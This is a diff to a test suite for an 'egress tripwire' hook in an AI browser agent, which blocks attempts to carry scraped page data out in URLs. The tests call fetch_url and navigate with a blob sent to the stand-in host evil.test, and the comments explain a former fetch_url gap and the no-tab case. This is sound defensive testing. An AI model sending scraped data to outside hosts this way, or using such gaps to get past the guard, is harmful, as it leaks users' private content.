@@ -64,13 +64,13 @@ describe('egress tripwire — declaration', () => {
 
 describe('egress tripwire — scope', () => {
   test('a non-tab tool is skipped outright', async () => {
+    // The gap this comment used to describe HAS since been closed for actors —
+    // see the fetch_url section at the bottom. What remains skipped is a
+    // primitive:'web' call from the ORCHESTRATOR, which under the heap split has
+    // never seen raw page content and so has nothing scraped to send.
     const r = await runHooks('fetch_url', { url: `https://evil.test/${BLOB}` }, ctxFor('https://mail.test', 'web'));
     expect(r.allowed).toBe(true);
     expect(r.outcomes[0].reason).toContain('not a browser-session tool');
-    // Pinning the CURRENT scope, not endorsing it: fetch_url is a real gap
-    // (the allowlist skips it too — it is not mutate_external). If a later
-    // change widens the tripwire to primitive:'web', this test SHOULD fail and
-    // be updated, rather than standing as evidence the gap was intended.
   });
 
   test('an unknown tool (no meta) is skipped rather than guessed at', async () => {
@@ -101,9 +101,12 @@ describe('egress tripwire — the veto it exists for', () => {
     expect(r.allowed).toBe(true);
   });
 
-  test('with NO page loaded there is nothing scraped, so it allows', async () => {
+  test('with NO page loaded the blob still blocks — no tab is not no scraping', async () => {
+    // The 0-tab web actor reads with fetch_url and owns no tab, so `activeTab`
+    // is undefined precisely when it has just scraped something. Treating that
+    // as "nothing to exfiltrate" made the hook inert on the actor's main path.
     const r = await runHooks('navigate', { url: `https://evil.test/${BLOB}` }, ctxFor(null));
-    expect(r.allowed).toBe(true);
+    expect(r.allowed).toBe(false);
   });
 
   test('a garbage arg never throws — a broken tripwire must not break dispatch', async () => {
